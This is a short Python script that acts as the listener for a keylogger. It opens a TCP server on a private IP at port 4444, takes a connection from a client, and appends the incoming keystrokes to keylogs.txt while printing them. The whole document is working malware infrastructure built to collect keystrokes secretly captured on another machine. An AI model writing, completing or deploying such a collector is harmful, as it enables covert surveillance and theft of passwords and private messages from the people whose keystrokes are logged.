import socket

host = '192.168.1.107' #Ip Host
port = 4444 #Port Host

#Create connection
s = socket.socket() 
s.bind((host, port))
s.listen(2)

#Function writing keyslogs
def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

#Display Ip adress
print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))

#Display keylogs
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    print(str(data))
conn.close()
